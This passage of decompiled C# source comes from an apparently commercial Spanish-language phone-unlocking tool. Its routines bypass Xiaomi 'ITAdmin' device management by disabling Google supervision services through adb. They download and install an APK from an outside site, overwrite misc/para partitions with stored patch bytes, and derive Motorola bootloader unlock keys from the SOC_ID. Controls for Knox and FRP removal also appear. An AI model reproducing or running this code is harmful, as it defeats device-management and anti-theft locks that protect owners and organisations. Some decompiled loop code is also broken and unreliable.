			Form1._Closure$__302-0 CS$<>8__locals1 = new Form1._Closure$__302-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_devices = this.GetAdbDevices();
			bool flag = CS$<>8__locals1.$VB$Local_devices.Count == 0;
			if (flag)
			{
				MessageBox.Show("No se detectó ningún dispositivo ADB.");
			}
			else
			{
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Clear();
					try
					{
						foreach (string item in CS$<>8__locals1.$VB$Local_devices)
						{
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Add(item);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedIndex = 0;
				}));
				CS$<>8__locals1.$VB$Local_selectedDevice = "";
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
				}));
				await this.EjecutarBypassItadmin2025(CS$<>8__locals1.$VB$Local_selectedDevice);
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x000119AC File Offset: 0x0000FBAC
		private async Task EjecutarBypassItadmin2025(string selectedDevice)
		{
			bool flag = this.processRunning;
			if (!flag)
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.ListView1.Visible = false;
				try
				{
					this.txtOutput.Clear();
					this.txtOutput.AppendText("Operation : MDM ITAdmin" + Environment.NewLine);
					this.txtOutput.AppendText("Remove Method : Xiaomi Redmi mdm V1" + Environment.NewLine + Environment.NewLine);
					this.LeerInformacionAdbPorMarca(selectedDevice);
					this.txtOutput.AppendText(Environment.NewLine);
					List<List<string>> etapasAdd = new List<List<string>>
					{
						new List<string>
						{
							"shell pm clear --user 0 com.google.android.gsf"
						},
						new List<string>
						{
							"shell pm clear --user 0 com.android.vending",
							"shell pm disable-user --user 0 com.android.vending"
						},
						new List<string>
						{
							"shell pm clear --user 0 com.google.android.gms",
							"shell pm disable-user --user 0 com.google.android.gms.supervision"
						}
					};
					string carpetaRecursos = "C:\\Tstool\\Tools";
					bool flag2 = !Directory.Exists(carpetaRecursos);
					if (flag2)
					{
						Directory.CreateDirectory(carpetaRecursos);
					}
					string rutaPApk = Path.Combine(carpetaRecursos, "P.apk");
					try
					{
						bool flag3 = !File.Exists(rutaPApk);
						if (flag3)
						{
							this.txtOutput.AppendText("\ud83d\udd04 Descargando Recursos en C:\\Tstool\\Tools..." + Environment.NewLine);
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/P.apk", rutaPApk);
							if (!exito)
							{
								throw new Exception("No se pudo descargar Recursos.");
							}
							this.txtOutput.AppendText("✅ Recursos descargados en C:\\Tstool\\Tools." + Environment.NewLine);
						}
					}
					catch (Exception ex)
					{
						this.txtOutput.AppendText(string.Format("❌ {0} Se canceló el proceso.", ex.Message) + Environment.NewLine);
						return;
					}
					List<string> instalarEtapa = new List<string>
					{
						string.Format("push {0} /data/local/tmp/P.apk", rutaPApk),
						"shell pm install --user 0 /data/local/tmp/P.apk",
						"shell am start -n com.aurora.store/com.aurora.store.MainActivity"
					};
					etapasAdd.Add(instalarEtapa);
					this.processRunning = false;
					await this.EjecutarEtapasAdbDesdeDiccionarioExtendido("Bypass Itadmin 2025", null, this.txtOutput, etapasAdd, null, null, true, false, "", false);
					this.GuardarLog(selectedDevice, "Xiomi Bypass Itadmin 2025", this.txtOutput);
					string textoPlano = this.txtOutput.Text;
					await this.GuardarLogEnFirebase(textoPlano);
				}
				finally
				{
					this.processRunning = false;
					this.SetAllButtonsEnabled(true, null);
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000154 RID: 340 RVA: 0x000119F8 File Offset: 0x0000FBF8
		private void ModifyBinaryFileAutomatically(string filePath)
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(filePath);
					int num = this.misc_mtk.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						bool flag = i < array.Length;
						if (flag)
						{
							array[i] = this.misc_mtk[i];
						}
					}
					string text = Path.Combine(Path.GetDirectoryName(filePath), string.Format("backup_{0}", Path.GetFileName(filePath)));
					bool flag2 = File.Exists(text);
					if (flag2)
					{
						File.Delete(text);
					}
					File.Move(filePath, text);
					File.WriteAllBytes(filePath, array);
					MessageBox.Show("Archivo modificado y guardado exitosamente. Se creó una copia de seguridad.", "Modificación Completa", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				catch (Exception ex)
				{
					MessageBox.Show(string.Format("Error al modificar el archivo: {0}", ex.Message), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x06000155 RID: 341 RVA: 0x00011AD4 File Offset: 0x0000FCD4
		private void ModifyBinaryFileAutomatically(string filePath, byte[] patchBytes)
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(filePath);
					int num = patchBytes.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						bool flag = i < array.Length;
						if (flag)
						{
							array[i] = patchBytes[i];
						}
					}
					string text = Path.Combine(Path.GetDirectoryName(filePath), string.Format("backup_{0}", Path.GetFileName(filePath)));
					bool flag2 = File.Exists(text);
					if (flag2)
					{
						File.Delete(text);
					}
					File.Move(filePath, text);
					File.WriteAllBytes(filePath, array);
				}
				catch (Exception ex)
				{
					throw new ApplicationException(string.Format("Error parcheando {0}: {1}", Path.GetFileName(filePath), ex.Message));
				}
			}
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00011B88 File Offset: 0x0000FD88
		private async void BtnPatchFileMotorola_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog dlgIn = new OpenFileDialog
			{
				Filter = "Zip files (*.zip)|*.zip",
				Title = "Seleccione un ZIP con misc.bin y/o para.bin"
			})
			{
				bool flag = dlgIn.ShowDialog() != DialogResult.OK;
				if (!flag)
				{
					using (SaveFileDialog dlgOut = new SaveFileDialog
					{
						Filter = "Zip files (*.zip)|*.zip",
						Title = "Guardar ZIP parcheado como",
						FileName = Path.GetFileNameWithoutExtension(dlgIn.FileName) + "_patched.zip"
					})
					{
						bool flag2 = dlgOut.ShowDialog() != DialogResult.OK;
						if (!flag2)
						{
							this.ProgressBar1.Value = 0;
							this.lblStatus.Text = "Iniciando…";
							this.txtOutput.Clear();
							StringBuilder logSb = new StringBuilder();
							IProgress<int> progNum = new Progress<int>(delegate(int p)
							{
								this.ProgressBar1.Value = p;
								this.lblStatus.Text = string.Format("Progreso: {0}%", p);
							});
							IProgress<string> progLog = new Progress<string>(delegate(string line)
							{
								this.txtOutput.AppendText(line + Environment.NewLine);
							});
							try
							{
								await Task.Run(delegate()
								{
									this.PatchZipInMemory(dlgIn.FileName, dlgOut.FileName, logSb, progNum, progLog);
								});
								string logPath = Path.Combine(Path.GetDirectoryName(dlgOut.FileName), Path.GetFileNameWithoutExtension(dlgOut.FileName) + "_patch.log");
								File.WriteAllText(logPath, logSb.ToString(), Encoding.UTF8);
								MessageBox.Show(string.Format("✅ Proceso completo!{0}", Environment.NewLine) + string.Format("ZIP parcheado: {0}{1}", dlgOut.FileName, Environment.NewLine) + string.Format("Log: {0}", logPath), "Éxito", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							}
							catch (Exception ex)
							{
								MessageBox.Show(string.Format("\ud83d\udeab Proceso cancelado: {0}", ex.Message), "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
							}
							finally
							{
								this.lblStatus.Text = "Listo";
								this.ProgressBar1.Value = 0;
							}
						}
					}
				}
			}
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00011BD0 File Offset: 0x0000FDD0
		private void PatchZipInMemory(string inputZipPath, string outputZipPath, StringBuilder logSb, IProgress<int> progNum, IProgress<string> progLog)
		{
			Form1._Closure$__310-0 CS$<>8__locals1 = new Form1._Closure$__310-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Local_logSb = logSb;
			CS$<>8__locals1.$VB$Local_progLog = progLog;
			Action<string> action = delegate(string msg)
			{
				string arg = DateTime.Now.ToString("s");
				string value = string.Format("[{0}] {1}", arg, msg);
				CS$<>8__locals1.$VB$Local_logSb.AppendLine(value);
				CS$<>8__locals1.$VB$Local_progLog.Report(value);
			};
			action(string.Format("Abriendo ZIP origen: {0}", inputZipPath));
			Dictionary<string, byte[]> dictionary = new Dictionary<string, byte[]>();
			checked
			{
				using (ZipArchive zipArchive = ZipFile.OpenRead(inputZipPath))
				{
					bool flag = zipArchive.Entries.Count == 0;
					if (flag)
					{
						throw new ApplicationException("El ZIP no contiene archivos.");
					}
					try
					{
						foreach (ZipArchiveEntry zipArchiveEntry in zipArchive.Entries)
						{
							string left = Path.GetFileNameWithoutExtension(zipArchiveEntry.Name).ToLowerInvariant();
							string left2 = Path.GetExtension(zipArchiveEntry.Name).ToLowerInvariant();
							bool flag2 = (Operators.CompareString(left, "misc", false) != 0 && Operators.CompareString(left, "para", false) != 0) || (Operators.CompareString(left2, ".bin", false) != 0 && Operators.CompareString(left2, ".img", false) != 0);
							if (flag2)
							{
								throw new ApplicationException(string.Format("Archivo no permitido: {0}", zipArchiveEntry.Name));
							}
						}
					}
					finally
					{
						IEnumerator<ZipArchiveEntry> enumerator;
						if (enumerator != null)
						{
							enumerator.Dispose();
						}
					}
					int count = zipArchive.Entries.Count;
					int num = 0;
					try
					{
						foreach (ZipArchiveEntry zipArchiveEntry2 in zipArchive.Entries)
						{
							num++;
							progNum.Report((int)Math.Round((double)(num * 100) / (double)count));
							action(string.Format("Procesando: {0} ({1} bytes)", zipArchiveEntry2.Name, zipArchiveEntry2.Length));
							string left3 = Path.GetFileNameWithoutExtension(zipArchiveEntry2.Name).ToLowerInvariant();
							long length = zipArchiveEntry2.Length;
							byte[] array;
							if (length != 524288L)
							{
								if (length != 1048576L)
								{
									throw new ApplicationException(string.Format("Tamaño inválido en {0}: {1} bytes.", zipArchiveEntry2.Name, length));
								}
								bool flag3 = Operators.CompareString(left3, "misc", false) == 0;
								if (!flag3)
								{
									throw new ApplicationException(string.Format("1 MB no soportado: {0}", zipArchiveEntry2.Name));
								}
								array = this.misc_qualcomm;
							}
							else
							{
								array = ((Operators.CompareString(left3, "misc", false) == 0) ? this.misc_mtk : this.para_mtk);
							}
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (Stream stream = zipArchiveEntry2.Open())
								{
									stream.CopyTo(memoryStream);
								}
								byte[] array2 = memoryStream.ToArray();
								int num2 = array.Length - 1;
								for (int i = 0; i <= num2; i++)
								{
									bool flag4 = i < array2.Length;
									if (flag4)
									{
										array2[i] = array[i];
									}
								}
								dictionary.Add(zipArchiveEntry2.FullName, array2);
								action(string.Format("Parche aplicado a {0}", zipArchiveEntry2.Name));
							}
						}
					}
					finally
					{
						IEnumerator<ZipArchiveEntry> enumerator2;
						if (enumerator2 != null)
						{
							enumerator2.Dispose();
						}
					}
				}
				progNum.Report(90);
				action(string.Format("Creando ZIP de salida: {0}", outputZipPath));
				bool flag5 = File.Exists(outputZipPath);
				if (flag5)
				{
					File.Delete(outputZipPath);
				}
				using (ZipArchive zipArchive2 = ZipFile.Open(outputZipPath, ZipArchiveMode.Create))
				{
					try
					{
						foreach (KeyValuePair<string, byte[]> keyValuePair in dictionary)
						{
							ZipArchiveEntry zipArchiveEntry3 = zipArchive2.CreateEntry(keyValuePair.Key, CompressionLevel.Optimal);
							using (Stream stream2 = zipArchiveEntry3.Open())
							{
								stream2.Write(keyValuePair.Value, 0, keyValuePair.Value.Length);
							}
							action(string.Format("Añadido al ZIP: {0}", keyValuePair.Key));
						}
					}
					finally
					{
						Dictionary<string, byte[]>.Enumerator enumerator3;
						((IDisposable)enumerator3).Dispose();
					}
				}
				action("Validando ZIP de salida…");
				using (ZipArchive zipArchive3 = ZipFile.OpenRead(outputZipPath))
				{
					try
					{
						foreach (string text in dictionary.Keys)
						{
							bool flag6 = zipArchive3.GetEntry(text) == null;
							if (flag6)
							{
								throw new ApplicationException(string.Format("Validación fallida: falta {0}", text));
							}
						}
					}
					finally
					{
						Dictionary<string, byte[]>.KeyCollection.Enumerator enumerator4;
						((IDisposable)enumerator4).Dispose();
					}
				}
				progNum.Report(100);
				action("Validación exitosa. Progreso al 100%.");
			}
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00012154 File Offset: 0x00010354
		private void btnservices_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			BuscarServicios buscarServicios = new BuscarServicios();
			buscarServicios.ShowDialog();
		}

		// Token: 0x06000159 RID: 345 RVA: 0x00012178 File Offset: 0x00010378
		public string RunPythonScript(string scriptPath, string args)
		{
			string result;
			try
			{
				Process process = Process.Start(new ProcessStartInfo("python", string.Format("\"{0}\" {1}", scriptPath, args))
				{
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				});
				string str = process.StandardOutput.ReadToEnd();
				string text = process.StandardError.ReadToEnd();
				process.WaitForExit();
				result = str + "\r\n" + ((Operators.CompareString(text, "", false) != 0) ? ("ERROR: " + text) : "");
			}
			catch (Exception ex)
			{
				result = "Execution failed: " + ex.Message;
			}
			return result;
		}

		// Token: 0x0600015A RID: 346 RVA: 0x00012248 File Offset: 0x00010448
		private string GetSOC_ID()
		{
			string input = this.RunFastbootCommand("oem get_key");
			Match match = Regex.Match(input, "([A-Fa-f0-9]{32})");
			bool success = match.Success;
			string result;
			if (success)
			{
				result = match.Groups[1].Value.ToUpper();
			}
			else
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00012298 File Offset: 0x00010498
		private async void btnUnlockBootloader_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.processRunning;
				if (flag)
				{
					MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
				}
				else
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					this.txtOutput.Clear();
					this.cmbDevices.Items.Clear();
					string deviceList = await Task.Run<string>(() => this.RunFastbootCommand("devices"));
					if (string.IsNullOrWhiteSpace(deviceList) || !deviceList.Contains("fastboot"))
					{
						this.txtOutput.AppendText("❌ No se detecta ningún dispositivo en modo Fastboot." + Environment.NewLine);
						MessageBox.Show("❌ No se detecta ningún dispositivo en modo Fastboot.", "Sin conexión", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						string sn = await Task.Run<string>(() => this.RunFastbootCommand("getvar serialno"));
						this.txtOutput.AppendText("Operation : Motorola Unlock Bootloader" + Environment.NewLine);
						this.txtOutput.AppendText("Remove Method : MTK y SPD" + Environment.NewLine);
						this.txtOutput.AppendText(this.CleanFastbootLog(sn, "") + Environment.NewLine);
						this.btnUnlockBootloader.Enabled = false;
						this.txtOutput.AppendText("Obteniendo SOC_ID..." + Environment.NewLine);
						string soc_id = await Task.Run<string>(() => this.GetSOC_ID());
						if (string.IsNullOrWhiteSpace(soc_id))
						{
							this.txtOutput.AppendText("❌ Error: No se pudo obtener el SOC_ID." + Environment.NewLine);
						}
						else
						{
							this.txtOutput.AppendText(string.Format("✅ SOC_ID obtenido: {0}{1}", soc_id, Environment.NewLine));
							this.txtOutput.AppendText("Generando clave de desbloqueo..." + Environment.NewLine);
							string unlockKey = this.GenerateUnlockKeyFromSOCID(soc_id);
							this.txtOutput.AppendText(string.Format("\ud83d\udd11 Clave generada: {0}{1}", unlockKey, Environment.NewLine));
							string result = await Task.Run<string>(() => this.RunFastbootCommand(string.Format("oem key {0}", unlockKey)));
							this.txtOutput.AppendText(Environment.NewLine + "━━━━━━━━━━━━━━━━━━━━━━━" + Environment.NewLine);
							this.txtOutput.AppendText("▶ Enviando comando: fastboot oem key" + Environment.NewLine);
							this.txtOutput.AppendText("Enviando comando: fastboot flashing unlock ..." + Environment.NewLine);
							this.txtOutput.AppendText("confirma en el dispositivo con Volumen Arriba para continuar el desbloqueo ..." + Environment.NewLine);
							MessageBox.Show("Por favor, confirma en el dispositivo con Volumen Arriba para continuar el desbloqueo.", "Confirmación requerida", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							string result2 = await Task.Run<string>(() => this.RunFastbootCommand("flashing unlock"));
							this.txtOutput.AppendText(this.CleanFastbootLog(result2, "fastboot flashing unlock") + Environment.NewLine);
							bool wasSuccess = this.WasUnlockSuccessful(result2);
							await Task.Run<string>(() => this.RunFastbootCommand("reboot"));
							if (wasSuccess)
							{
								this.txtOutput.AppendText("\ud83d\udfe2 Bootloader desbloqueado correctamente." + Environment.NewLine);
								MessageBox.Show("¡Bootloader desbloqueado con éxito!", "Desbloqueo exitoso", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							}
							else
							{
								this.txtOutput.AppendText("\ud83d\udd12 El bootloader **NO** fue desbloqueado. Es posible que el OEM Unlock esté deshabilitado en el dispositivo." + Environment.NewLine);
								MessageBox.Show("Desbloqueo fallido. Verifica si el OEM Unlock está activado en el dispositivo.", "Desbloqueo no permitido", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
							}
							this.RestaurarEstadoUI();
						}
					}
					this.processRunning = false;
					this.SetAllButtonsEnabled(true, null);
					this.btnUnlockBootloader.Enabled = true;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText("❌ Error inesperado: " + ex.Message + Environment.NewLine);
				MessageBox.Show("Ocurrió un error inesperado: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				this.RestaurarEstadoUI();
			}
		}

		// Token: 0x0600015C RID: 348 RVA: 0x000122DF File Offset: 0x000104DF
		private void RestaurarEstadoUI()
		{
			this.processRunning = false;
			this.SetAllButtonsEnabled(true, null);
			this.btnUnlockBootloader.Enabled = true;
			this.btnCancelarProceso.Enabled = false;
			this.AplicarPermisosDesdeFirebasePorPlan();
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00012314 File Offset: 0x00010514
		private string RunFastbootCommand(string arguments)
		{
			string result;
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "fastboot";
				processStartInfo.Arguments = arguments;
				processStartInfo.UseShellExecute = false;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.CreateNoWindow = true;
				using (Process process = new Process())
				{
					process.StartInfo = processStartInfo;
					process.Start();
					string arg = process.StandardOutput.ReadToEnd();
					string arg2 = process.StandardError.ReadToEnd();
					process.WaitForExit(10000);
					result = string.Format("{0}{1}ERROR: {2}", arg, Environment.NewLine, arg2).Trim();
				}
			}
			catch (Exception ex)
			{
				result = "ERROR EJECUCIÓN: " + ex.Message;
			}
			return result;
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00012400 File Offset: 0x00010600
		private string GenerateUnlockKeyFromSOCID(string soc_id)
		{
			string s = soc_id + soc_id;
			byte[] bytes = Encoding.ASCII.GetBytes(s);
			byte[] value = SHA256.Create().ComputeHash(bytes);
			string text = BitConverter.ToString(value).Replace("-", "").ToLower();
			return text.Substring(0, 32);
		}

		// Token: 0x0600015F RID: 351 RVA: 0x00012458 File Offset: 0x00010658
		private string CleanFastbootLog(string rawLog, string commandTitle = "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			bool flag = !string.IsNullOrEmpty(commandTitle);
			if (flag)
			{
				stringBuilder.AppendLine(string.Format("\ud83d\udfe2 Comando enviado: {0}", commandTitle));
			}
			string[] array = rawLog.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.None);
			bool flag2 = false;
			foreach (string text in array)
			{
				string text2 = text.Trim();
				bool flag3 = flag2;
				if (flag3)
				{
					bool flag4 = text2.EndsWith(")");
					if (flag4)
					{
						flag2 = false;
					}
				}
				else
				{
					bool flag5 = text2.StartsWith("FAILED (remote:");
					if (flag5)
					{
						flag2 = true;
					}
					else
					{
						bool flag6 = string.IsNullOrWhiteSpace(text2);
						if (!flag6)
						{
							bool flag7 = text2.StartsWith("ERROR: serialno:");
							if (flag7)
							{
								stringBuilder.AppendLine("\ud83d\udcf1 Serial Number: " + text2.Replace("ERROR: serialno:", "").Trim());
							}
							else
							{
								bool flag8 = text2.StartsWith("serialno:");
								if (flag8)
								{
									stringBuilder.AppendLine("\ud83d\udcf1 Serial Number: " + text2.Replace("serialno:", "").Trim());
								}
								else
								{
									bool flag9 = Operators.CompareString(text2, "ERROR: ...", false) == 0 || Operators.CompareString(text2, "ERROR:", false) == 0;
									if (!flag9)
									{
										bool flag10 = text2.Contains("(bootloader)");
										if (flag10)
										{
											stringBuilder.AppendLine("\ud83d\udce5 Bootloader: " + text2.Replace("(bootloader)", "").Trim());
										}
										else
										{
											bool flag11 = text2.StartsWith("OKAY");
											if (flag11)
											{
												stringBuilder.AppendLine("✅ OKAY " + text2.Substring(4).Trim());
											}
											else
											{
												bool flag12 = text2.StartsWith("FAILED");
												if (flag12)
												{
													stringBuilder.AppendLine("❌ " + text2);
												}
												else
												{
													bool flag13 = text2.StartsWith("finished.");
													if (flag13)
													{
														stringBuilder.AppendLine("⏱️ " + text2);
													}
													else
													{
														bool flag14 = text2.StartsWith("ERROR:");
														if (flag14)
														{
															string text3 = text2.Replace("ERROR:", "").Trim();
															bool flag15 = !string.IsNullOrWhiteSpace(text3);
															if (flag15)
															{
																stringBuilder.AppendLine("⚠️ " + text3);
															}
														}
														else
														{
															stringBuilder.AppendLine("\ud83d\udcc4 " + text2);
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000160 RID: 352 RVA: 0x00012710 File Offset: 0x00010910
		private bool WasUnlockSuccessful(string rawLog)
		{
			string text = rawLog.ToLower();
			return text.Contains("unlock success") && text.Contains("fastboot unlock success") && text.Contains("okay") && !text.Contains("unlock operation is not allowed");
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000163 RID: 355 RVA: 0x000156B2 File Offset: 0x000138B2
		// (set) Token: 0x06000164 RID: 356 RVA: 0x000156BC File Offset: 0x000138BC
		internal virtual Button btnReadAdb
		{
			[CompilerGenerated]
			get
			{
				return this._btnReadAdb;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnReadAdb_Click);
				Button btnReadAdb = this._btnReadAdb;
				if (btnReadAdb != null)
				{
					btnReadAdb.Click -= value2;
				}
				this._btnReadAdb = value;
				btnReadAdb = this._btnReadAdb;
				if (btnReadAdb != null)
				{
					btnReadAdb.Click += value2;
				}
			}
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000165 RID: 357 RVA: 0x000156FF File Offset: 0x000138FF
		// (set) Token: 0x06000166 RID: 358 RVA: 0x00015709 File Offset: 0x00013909
		internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000167 RID: 359 RVA: 0x00015712 File Offset: 0x00013912
		// (set) Token: 0x06000168 RID: 360 RVA: 0x0001571C File Offset: 0x0001391C
		internal virtual ComboBox cmbDevicesAdb
		{
			[CompilerGenerated]
			get
			{
				return this._cmbDevicesAdb;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.cmbDevicesAdb_DropDown);
				ComboBox cmbDevicesAdb = this._cmbDevicesAdb;
				if (cmbDevicesAdb != null)
				{
					cmbDevicesAdb.DropDown -= value2;
				}
				this._cmbDevicesAdb = value;
				cmbDevicesAdb = this._cmbDevicesAdb;
				if (cmbDevicesAdb != null)
				{
					cmbDevicesAdb.DropDown += value2;
				}
			}
		}

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000169 RID: 361 RVA: 0x0001575F File Offset: 0x0001395F
		// (set) Token: 0x0600016A RID: 362 RVA: 0x00015769 File Offset: 0x00013969
		internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600016B RID: 363 RVA: 0x00015772 File Offset: 0x00013972
		// (set) Token: 0x0600016C RID: 364 RVA: 0x0001577C File Offset: 0x0001397C
		internal virtual ErrorProvider ErrorProvider1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600016D RID: 365 RVA: 0x00015785 File Offset: 0x00013985
		// (set) Token: 0x0600016E RID: 366 RVA: 0x0001578F File Offset: 0x0001398F
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x0600016F RID: 367 RVA: 0x00015798 File Offset: 0x00013998
		// (set) Token: 0x06000170 RID: 368 RVA: 0x000157A2 File Offset: 0x000139A2
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000171 RID: 369 RVA: 0x000157AB File Offset: 0x000139AB
		// (set) Token: 0x06000172 RID: 370 RVA: 0x000157B8 File Offset: 0x000139B8
		internal virtual ComboBox cmbPuertos
		{
			[CompilerGenerated]
			get
			{
				return this._cmbPuertos;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.cmbPuertos_DropDown);
				ComboBox cmbPuertos = this._cmbPuertos;
				if (cmbPuertos != null)
				{
					cmbPuertos.DropDown -= value2;
				}
				this._cmbPuertos = value;
				cmbPuertos = this._cmbPuertos;
				if (cmbPuertos != null)
				{
					cmbPuertos.DropDown += value2;
				}
			}
		}

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000173 RID: 371 RVA: 0x000157FB File Offset: 0x000139FB
		// (set) Token: 0x06000174 RID: 372 RVA: 0x00015808 File Offset: 0x00013A08
		internal virtual Button btnReadComSm
		{
			[CompilerGenerated]
			get
			{
				return this._btnReadComSm;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnReadComSm_Click);
				Button btnReadComSm = this._btnReadComSm;
				if (btnReadComSm != null)
				{
					btnReadComSm.Click -= value2;
				}
				this._btnReadComSm = value;
				btnReadComSm = this._btnReadComSm;
				if (btnReadComSm != null)
				{
					btnReadComSm.Click += value2;
				}
			}
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000175 RID: 373 RVA: 0x0001584B File Offset: 0x00013A4B
		// (set) Token: 0x06000176 RID: 374 RVA: 0x00015858 File Offset: 0x00013A58
		internal virtual Button btnactatadb
		{
			[CompilerGenerated]
			get
			{
				return this._btnactatadb;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnactatadb_Click);
				Button btnactatadb = this._btnactatadb;
				if (btnactatadb != null)
				{
					btnactatadb.Click -= value2;
				}
				this._btnactatadb = value;
				btnactatadb = this._btnactatadb;
				if (btnactatadb != null)
				{
					btnactatadb.Click += value2;
				}
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000177 RID: 375 RVA: 0x0001589B File Offset: 0x00013A9B
		// (set) Token: 0x06000178 RID: 376 RVA: 0x000158A8 File Offset: 0x00013AA8
		internal virtual Button btnKnox
		{
			[CompilerGenerated]
			get
			{
				return this._btnKnox;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnKnox_Click);
				Button btnKnox = this._btnKnox;
				if (btnKnox != null)
				{
					btnKnox.Click -= value2;
				}
				this._btnKnox = value;
				btnKnox = this._btnKnox;
				if (btnKnox != null)
				{
					btnKnox.Click += value2;
				}
			}
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000179 RID: 377 RVA: 0x000158EB File Offset: 0x00013AEB
		// (set) Token: 0x0600017A RID: 378 RVA: 0x000158F8 File Offset: 0x00013AF8
		internal virtual Button btnFRP
		{
			[CompilerGenerated]
			get
			{
				return this._btnFRP;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnFRP_Click);
				Button btnFRP = this._btnFRP;
				if (btnFRP != null)
				{
					btnFRP.Click -= value2;
				}
				this._btnFRP = value;
				btnFRP = this._btnFRP;
				if (btnFRP != null)
				{
					btnFRP.Click += value2;
				}
			}
		}

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x0600017B RID: 379 RVA: 0x0001593B File Offset: 0x00013B3B
		// (set) Token: 0x0600017C RID: 380 RVA: 0x00015948 File Offset: 0x00013B48
		internal virtual Button btnMsjTelcelNew
		{
			[CompilerGenerated]
			get
			{
				return this._btnMsjTelcelNew;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnMsjTelcelNew_Click);
				Button btnMsjTelcelNew = this._btnMsjTelcelNew;
				if (btnMsjTelcelNew != null)
				{
					btnMsjTelcelNew.Click -= value2;
				}
				this._btnMsjTelcelNew = value;
				btnMsjTelcelNew = this._btnMsjTelcelNew;
